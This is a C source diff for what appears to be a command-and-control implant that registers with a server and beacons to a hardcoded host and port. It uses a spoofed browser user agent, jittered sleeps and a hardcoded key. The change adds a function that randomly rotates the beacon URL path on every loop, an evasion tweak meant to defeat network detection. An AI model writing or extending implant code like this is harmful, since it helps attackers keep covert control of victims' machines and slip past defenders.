@@ -4,6 +4,7 @@
 #include <stdio.h>
 #include <settings.h>
 #include <imports.h>
+#include <paths.h>
 
 BOOL Registration(CHAR **cookie) {
     HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
@@ -179,12 +180,19 @@ void Sleep_Time() {
     Sleep(jitter);
 }
 
+char* Directoryyyyy() {
+    int dir_num = rand() % 5;
+    char* rand_path = paths[dir_num];
+
+    return rand_path;
+}
+
 int main() {
     CHAR *cookie = NULL;
     agent.address = "192.168.227.131";
     agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
     agent.port = 8080;
-    agent.path = "/about-us";
+    agent.path = Directoryyyyy();
     agent.key = "boondoggle";
 
     Registration(&cookie);
@@ -192,6 +200,7 @@ int main() {
     printf(cookie);
 
     while(TRUE) {
+        agent.path = Directoryyyyy();
         Beacon(cookie);
         Sleep_Time();
     }
